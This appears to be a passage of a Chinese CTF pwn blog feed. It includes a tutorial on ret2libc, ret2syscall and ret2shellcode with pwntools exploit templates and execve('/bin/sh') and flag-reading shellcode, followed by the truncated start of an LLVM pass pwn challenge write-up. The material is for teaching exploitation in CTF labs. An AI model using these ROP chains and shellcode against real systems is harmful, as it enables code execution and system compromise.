title="无system无&#x2F;bin&#x2F;sh"></a>无system无&#x2F;bin&#x2F;sh</h4><p>可执行文件中没有<code>system</code>，但是作为动态链接库的<code>libc</code>中有，所以直接执行<code>libc</code>中的<code>system</code>即可，所以思路就是先获取<code>libc</code>的基址，再计算<code>libc</code>中<code>system</code>和<code>/bin/sh</code>的地址，最后执行<code>system(&#39;/bin/sh&#39;)</code></p><p><code>got</code>部分提到<code>got</code>表存放了外部符号地址，即<code>libc</code>中的地址，所以如果能够泄露<code>got</code>表中的地址就能获取<code>libc</code>中某个函数的真实地址，再减去这个函数在<code>libc</code>中的偏移就能得到<code>libc</code>的基址，最后加上<code>system</code>函数的偏移就能得到<code>system</code>函数的地址</p><ul><li><p>泄露<code>got</code>表中函数的地址</p><p>需要用一个输出函数输出一个<code>got</code>表的地址，一般构造<code>puts(puts_got)</code>，最后还要再回到该函数继续利用栈溢出，即<code>p64(pop_rdi_ret) + p64(puts_got) + p64(puts) + p64(main)</code></p><p>接收该地址：基本就是一个固定用法<code>u64(r.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))</code></p></li><li><p>获取<code>libc</code>基址</p><p>标志：64位以<code>7f</code>开头，基址末尾三位是0</p><p>已知<code>puts</code>函数的真实地址和<code>puts</code>函数的偏移，<code>libc</code>的基址就等于真实地址减偏移</p><p>获取<code>puts</code>函数在<code>libc</code>中的偏移可以通过<code>libc = ELF(&#39;libc文件&#39;)</code>，然后<code>libc.sym[&#39;puts&#39;]</code>得到<code>puts</code>偏移</p><p>在打本地的时候如果修改了<code>libc</code>版本需要对应修改<code>ELF</code>里的文件路径，也可以直接在本地打通之后修改文件路径为远程的<code>libc</code>文件后直接打远程</p></li><li><p>获取<code>system</code>和<code>/bin/sh</code>地址：从<code>libc</code>获取地址需要<strong>加上基址</strong></p><p><code>system = libc.sym[&#39;system&#39;] + libc_base</code></p><p><code>bin_sh = libc.search(b&#39;/bin/sh\x00&#39;).__next__() + libc_base</code></p></li></ul><p>最终构造：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ROPgadget --binary ./pwn --only 'pop|ret' | grep 'rdi' -> pop_rdi_ret</span>pop_rdi_ret <span class="token operator">=</span> main <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ? <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc文件路径'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basebin_sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ? <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h4><p>某些指令，如<code>movaps</code>（用于操作<code>XMM</code>寄存器），要求栈指针<code>RSP</code>必须是<code>16</code>字节对齐的，直接从返回地址开始写<code>rop</code>链可能会造成堆栈不平衡，需要在<code>rop</code>链前加上汇编指令<code>ret</code>平衡堆栈</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--only</span> <span class="token string">'ret'</span><span class="token comment">#查找ret指令的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="32位程序"><a href="#32位程序" class="headerlink" title="32位程序"></a>32位程序</h4><p>32位和64位的区别就是32位通过栈传参而不通过寄存器传参，所以不像64位需要找<code>pop rdi</code>的值，32位构造<code>rop</code>链的方式是函数+返回地址+参数列表，例如</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ?p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gets<span class="token punctuation">)</span><span class="token comment">#gets(buf)</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token comment">#system(buf)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>对应32位的程序</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x64</span> <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gets_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p><a href="https://starrysky1004.github.io/ret2libc.zip">https://starrysky1004.github.io/ret2libc.zip</a></p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>在题目没有给<code>libc</code>的情况下可以通过泄露多个已知函数名的地址，在<a href="https://libc.rip/%E4%B8%AD%E6%9F%A5%E8%AF%A2">https://libc.rip/中查询</a></p><h2 id="4-ret2syscall-amp-ret2shellcode-amp-零碎知识点"><a href="#4-ret2syscall-amp-ret2shellcode-amp-零碎知识点" class="headerlink" title="4.ret2syscall&amp;ret2shellcode&amp;零碎知识点"></a>4.ret2syscall&amp;ret2shellcode&amp;零碎知识点</h2><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><h4 id="前置基础-2"><a href="#前置基础-2" class="headerlink" title="前置基础"></a>前置基础</h4><p>操作系统的进程空间分为用户空间和内核空间，内核空间需要更高的权限，系统调用就是运行在用户空间的程序向操作系统内核请求需要更高权限运行的<strong>内核函数</strong></p><p>当用户态进程发起一个系统调用，<code>CPU</code>切换到内核态并开始执行一个内核函数。由于系统调用处理函数只有一个，所以需要通过<code>rax</code>传递系统调用号确定调用的函数</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>应用程序在用户态准备好调用参数（包括系统调用号和函数参数），在<code>64</code>位程序中执行<code>syscall</code>或在<code>32</code>位程序中执行<code>int 80</code>触发软中断，<code>CPU</code>被软中断打断后执行对应中断处理函数，最后执行<code>ret</code>指令切换回用户态</p><p>常用系统调用号：</p><p><code>32</code>位  <code>read 3  open 5write 4  sigreturn 77/0x4Dexecve 11/0xb</code></p><p><code>64</code>位  <code>read 0      open 2write 1  sigreturn 15/0xF   execve 59/0x3b</code></p><p><code>execve</code>用法：<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对比<code>ret2libc</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>xxx_plt<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>全部系统调用号参考：<a href="https://syscalls.mebeim.net/?table=x86/64/x64/latest">https://syscalls.mebeim.net/?table=x86/64/x64/latest</a></p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><h4 id="前置基础-3"><a href="#前置基础-3" class="headerlink" title="前置基础"></a>前置基础</h4><p>控制程序执行<code>shellcode</code>代码，<code>shellcode</code>指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的<code>shell</code>，或者<code>open read write</code>获取并输出<code>flag</code>，通常情况下<code>shellcode</code>需要我们自行编写，即向内存中填充一些可执行的代码</p><p>前提条件：<code>shellcode</code>所在的区域具有可执行权限</p><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>查看禁用的函数<code>seccomp-tools dump ./pwn</code></p><p><code>exp</code>中<code>pwntools</code>使用：</p><ul><li><p>使用<code>asm()</code>将汇编代码转换为对应的机器码</p></li><li><p>生成<code>shell</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>生成<code>orw</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x123000</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment">#'rsp'</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x123000</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>自己写<code>shellcode</code></p><ul><li><p>执行<code>execve(&#39;/bin/sh&#39;, 0, 0)</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">shellcode &#x3D; &#39;&#39;&#39;xor rdx,rdxpush rdxmov rsi,rspmov rax,0x68732f2f6e69622fpush raxmov rdi,rspmov rax,59syscall&#39;&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>执行<code>open read write</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">shellcode &#x3D; &quot;&quot;&quot;push 0x67616c66mov rdi,rspxor esi,esipush 2pop raxsyscallmov rdi,raxmov rsi,rspmov edx,0x100xor eax,eaxsyscallmov edi,1mov rsi,rsppush 1pop raxsyscall&quot;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><p>在线汇编和反汇编：<a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/">http://shell-storm.org/online/Online-Assembler-and-Disassembler/</a></p><h4 id="常见情况"><a href="#常见情况" class="headerlink" title="常见情况"></a>常见情况</h4><ul><li>没有开启<code>NX</code>保护，可以泄露栈地址向栈中写入<code>shellcode</code>再将返回地址改到该地址</li><li>程序使用<code>mprotect</code>函数给某一段可读可写可执行权限，并且让用户向这一段的变量中输入，再直接将输入的变量作为函数调用</li></ul><h3 id="零碎知识点"><a href="#零碎知识点" class="headerlink" title="零碎知识点"></a>零碎知识点</h3><p>整数溢出：变量定义为整型但输入后<code>(unsigned int)</code>强制转化为无符号整型，输入<code>-1</code>则变成正无穷</p><p>字符溢出：<code>char</code>类型范围是<code>-128~+127</code>，因此输入超过<code>128</code>会变成负数</p><p>数组越界：<code>index</code>可控的时候越界写到其他变量</p><p><code>str</code>类函数：例如<code>strcpy</code>、<code>strcat</code>、<code>strcmp</code>、<code>strlen</code>等函数会被<code>\x00</code>截断</p><p><code>scanf</code>：输入<code>+</code>或<code>-</code>不会有实际输入</p><p>随机数绕过：利用<code>c</code>和<code>python</code>联合编程，例如：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'./2.35/libc.so.6'</span><span class="token punctuation">)</span>seed <span class="token operator">=</span> <span class="token number">0</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v6 <span class="token operator">=</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'input: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-pwn环境配置&quot;&gt;&lt;a href=&quot;#1-pwn环境配置&quot; class=&quot;headerlink&quot; title=&quot;1.pwn环境配置&quot;&gt;&lt;/a&gt;1.pwn环境配置&lt;/h2&gt;&lt;p&gt;视频讲解：&lt;a href=&quot;https://www.bilibili.com/vid</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="教程" scheme="https://starrysky1004.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>LLVM PASS PWN：使用c++编写exp</title>
    <link href="https://starrysky1004.github.io/2024/10/31/llvm-pass-shi-yong-c-bian-xie-exp/llvm-pass-shi-yong-c-bian-xie-exp/"/>
    <id>https://starrysky1004.github.io/2024/10/31/llvm-pass-shi-yong-c-bian-xie-exp/llvm-pass-shi-yong-c-bian-xie-exp/</id>
    <published>2024-10-31T03:27:53.000Z</published>
    <updated>2024-10-31T03:31:53.422Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近比赛中遇到一道<code>llvm pass pwn</code>，现学了一下相关知识，发现网上的讲解和例题的<code>exp</code>基本都是用的<code>c</code>语言，而比赛中的这题在题目描述中说明了用的是<code>c++</code>，虽然用<code>c</code>也可以通过修改<code>.ll</code>文件完成，但是相比之下还是觉得直接用<code>c++</code>写<code>exp</code>方便一些，主要体现在：</p><ul><li><code>c</code>语言需要导入<code>#include &lt;stdbool.h&gt;</code>头才能使用<code>bool</code>类型</li><li><code>c</code>语言没有<code>class</code>，需要先写成<code>struct</code>再修改<code>.ll</code>文件中的<code>struct</code>为<code>class</code>，且使用<code>struct</code>编写本身也比<code>class</code>麻烦</li></ul><h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><h3 id="llvm"><a href="#llvm" class="headerlink" title="llvm"></a>llvm</h3><p><code>llvm</code>的作用：<code>gcc</code>编译时前后端耦合在一起，出现新平台或编译程序都需要重新设计<code>IR</code>，而<code>llvm</code>使用统一的中间代码不需要设计新的<code>IR</code></p><p><code>llvm pass</code>：对<code>ir</code>进行分析 优化等操作的过程的模块</p><p><code>IR</code>的三种表现形式:</p><ul><li><code>.ll</code>：可读<code>IR</code>，类似汇编</li><li><code>.bc</code>：不可读二进制<code>IR</code></li><li>保存在内存中</li></ul><p><code>llvm</code>工具</p><ul><li><code>llvm-as</code>：把<code>LLVM IR</code>从人可读的文本格式汇编成成二进制格式</li><li><code>llvm-dis</code>：<code>llvm-as</code>的逆过程，即反汇编</li><li><code>opt</code>：优化<code>LLVM IR</code>，输出新的<code>LLVM IR</code></li><li><code>llc</code>：把<code>LLVM IR</code>编译成汇编码</li><li><code>lli</code>：解释执行<code>LLVM IR</code></li></ul><p>环境配置:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> clang-12 clang-8 llvm-12 llvm-8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>程序编译:</p><ul><li><p>编译为<code>.ll</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">clang-12 -emit-llvm <span class="token parameter variable">-S</span> exp.c <span class="token parameter variable">-o</span> exp.ll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>编译为<code>.bc</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">clang-12 -emit-llvm <span class="token parameter variable">-c</span> exp.c <span class="token parameter variable">-o</span> exp.bc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>程序运行:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">opt-12 <span class="token parameter variable">-load</span> ./xxx.so -标识符 ./exp.ll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中标识符与加载的动态库中注册的一个<code>pass</code>相关联，可以使用<code>-标识符</code>来启用这个<code>pass</code></p><h3 id="c-函数名修饰规则"><a href="#c-函数名修饰规则" class="headerlink" title="c++函数名修饰规则"></a>c++函数名修饰规则</h3><p>使用<code>gcc</code>或<code>clang</code>编译<code>c++</code>时会经过名称修饰的过程从而改变函数名，修饰后的名称通常包括：</p><ul><li><p><code>_Z</code>：修饰名称的开始</p></li><li><p><code>N</code>：表示这是一个函数或静态成员函数</p></li><li><p>数字：表示函数名称的长度</p></li><li><p>类名和函数名：经过编码的类名和函数名</p></li><li><p><code>E</code>：参数列表的开始</p></li><li><p>参数类型：通过不同的字母按顺序表示参数类型</p><table><thead><tr><th>字母</th><th>参数类型</th></tr></thead><tbody><tr><td>i</td><td>int</td></tr><tr><td>j</td><td>unsigned int</td></tr><tr><td>l</td><td>long</td></tr><tr><td>x</td><td>long long</td></tr><tr><td>m</td><td>unsigned long</td></tr><tr><td>c</td><td>char</td></tr><tr><td>h</td><td>unsigned char</td></tr><tr><td>b</td><td>bool</td></tr></tbody></table></li><li><p>结尾：包含额外信息如返回类型</p></li></ul><p>例如<code>_ZN4edoc4addiEhii</code>表示在<code>edoc</code>类中的函数名长度为<code>4</code>的函数<code>addi</code>，它的三个参数分别是<code>unsigned char</code>、<code>int</code>、<code>int</code>类型</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h3><p>题目一般会给出<code>ld-linux-x86-64.so.2</code>、<code>libc.so.6</code>、<code>opt-12</code>、<code>xxx.so</code>和一个说明文档，说明文档会给出如何编译运行以及打远程，一般是将<code>.ll</code>或者<code>.bc</code>文件进行<code>base64</code>编码发送到远程，漏洞点出现在<code>xxx.so</code>，即需要逆向分析的就是这个<code>xxx.so</code>，而攻击的是<code>opt</code>程序，<code>opt</code>程序没给的话也可以用<code>/bin/opt-12</code></p><ul><li><p>在初始化函数(例如<code>_cxx_global_var_init_17</code>)中找到标识符（即<code>StringRef</code>函数的参数)</p></li><li><p>导入动态链接库<code>sudo cp xxx.so /lib</code></p></li><li><p>在<code>xxx.so</code>的<code>.data.rel.ro</code>段找到虚表，虚表的最后一项就是程序入口</p></li><li><p>进行动态调试，确定入口函数名、其他函数名、类名等</p></li><li><p>编写交互脚本</p></li><li><p>逆向分析函数，编写<code>exp</code>脚本</p></li></ul><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>使用<code>gdb opt-12</code>进行调试，并且通过<code>set args -load ./xxx.so -xxx ./exp.ll</code>导入参数，在<code>main</code>函数下断点，运行至所有<code>llvm::initialize</code>前缀的初始化函数结束，使用<code>vmmap</code>获取<code>xxx.so</code>的基址，通过<code>IDA</code>中的偏移下断点进行进一步调试（如果没有基址说明初始胡函数还没运行完</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="show-me-the-code"><a href="#show-me-the-code" class="headerlink" title="show_me_the_code"></a>show_me_the_code</h3><p>题目来源于源鲁杯<code>Round3</code>的困难题，给了<code>codeVM.so</code>、<code>ld-linux-x86-64.so.2</code>、<code>libc.so.6</code>、<code>opt-12</code>、说明文档和<code>docker</code>，给出编译指令<code>clang-12 -emit-llvm -S exp.cpp -o exp.ll</code>，上传题解的方式是将<code>exp.ll</code>进行<code>base64</code>编码并且在最后加上换行和<code>EOF</code>发送到远程，从编译指令可以看出需要用<code>c++</code>编写<code>exp</code></p><h4 id="确定标识符"><a href="#确定标识符" class="headerlink" title="确定标识符"></a>确定标识符</h4><p>直接搜索函数名<code>init</code>找到函数<code>_cxx_global_var_init_17</code>中有标识符<code>Co00o0oOd3</code>，确定了程序的运行方式是<code>./opt-12 -load ./codeVM.so -Co00o0oOd3 ./exp.ll</code>，这里需要先执行<code>sudo cp codeVM.so /lib</code>导入动态链接库</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">_cxx_global_var_init_17</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h] BYREF</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-10h] BYREF</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  llvm<span class="token operator">::</span>StringRef<span class="token operator">::</span><span class="token function">StringRef</span><span class="token punctuation">(</span><span class="token punctuation">(</span>llvm<span class="token operator">::</span>StringRef <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token string">"Co00o0oOd3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  llvm<span class="token operator">::</span>StringRef<span class="token operator">::</span><span class="token function">StringRef</span><span class="token punctuation">(</span><span class="token punctuation">(</span>llvm<span class="token operator">::</span>StringRef <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">,</span> <span class="token string">"c0oo0o0Ode Pass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  llvm<span class="token operator">::</span>RegisterPass<span class="token operator">&lt;</span>`anonymous namespace'<span class="token operator">::</span>c0oo0o0Ode<span class="token operator">></span><span class="token operator">::</span><span class="token function">RegisterPass</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>X<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__cxa_atexit</span><span class="token punctuation">(</span>llvm<span class="token operator">::</span>RegisterPass<span class="token operator">&lt;</span>`anonymous namespace'<span class="token operator">::</span>c0oo0o0Ode<span class="token operator">></span><span class="token operator">::</span><span class="token operator">~</span>RegisterPass<span class="token punctuation">,</span> <span class="token operator">&amp;</span>X<span class="token punctuation">,</span> <span class="token operator">&amp;</span>_dso_handle<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="确定程序入口函数"><a href="#确定程序入口函数" class="headerlink" title="确定程序入口函数"></a>确定程序入口函数</h4><p>在<code>.data.rel.ro</code>段找到了<code>vtable</code>，最后一项&#96;&#96;anonymous namespace’::c0oo0o0Ode::runOnFunction(llvm::Function &amp;)&#96;就是程序入口，直接点进这个函数</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.data.rel.ro:0000000000030D08                 dq offset _ZN12_GLOBAL__N_110c0oo0o0OdeD2Ev ; &#96;anonymous namespace&#39;::c0oo0o0Ode::~c0oo0o0Ode().data.rel.ro:0000000000030D10                 dq offset _ZN12_GLOBAL__N_110c0oo0o0OdeD0Ev ; &#96;anonymous namespace&#39;::c0oo0o0Ode::~c0oo0o0Ode().data.rel.ro:0000000000030D18                 dq offset _ZNK4llvm4Pass11getPassNameEv ; llvm::Pass::getPassName(void).data.rel.ro:0000000000030D20                 dq offset _ZN4llvm4Pass16doInitializationERNS_6ModuleE ; llvm::Pass::doInitialization(llvm::Module &amp;).data.rel.ro:0000000000030D28                 dq offset _ZN4llvm4Pass14doFinalizationERNS_6ModuleE ; llvm::Pass::doFinalization(llvm::Module &amp;).data.rel.ro:0000000000030D30                 dq offset _ZNK4llvm4Pass5printERNS_11raw_ostreamEPKNS_6ModuleE ; llvm::Pass::print(llvm::raw_ostream &amp;,llvm::Module const*).data.rel.ro:0000000000030D38                 dq offset _ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE ; llvm::FunctionPass::createPrinterPass(llvm::raw_ostream &amp;,std::string const&amp;).data.rel.ro:0000000000030D40                 dq offset _ZN4llvm12FunctionPass17assignPassManagerERNS_7PMStackENS_15PassManagerTypeE ; llvm::FunctionPass::assignPassManager(llvm::PMStack &amp;,llvm::PassManagerType).data.rel.ro:0000000000030D48                 dq offset _ZN4llvm4Pass18preparePassManagerERNS_7PMStackE ; llvm::Pass::preparePassManager(llvm::PMStack &amp;).data.rel.ro:0000000000030D50                 dq offset _ZNK4llvm12FunctionPass27getPotentialPassManagerTypeEv ; llvm::FunctionPass::getPotentialPassManagerType(void).data.rel.ro:0000000000030D58                 dq offset _ZNK4llvm4Pass16getAnalysisUsageERNS_13AnalysisUsageE ; llvm::Pass::getAnalysisUsage(llvm::AnalysisUsage &amp;).data.rel.ro:0000000000030D60                 dq offset _ZN4llvm4Pass13releaseMemoryEv ; 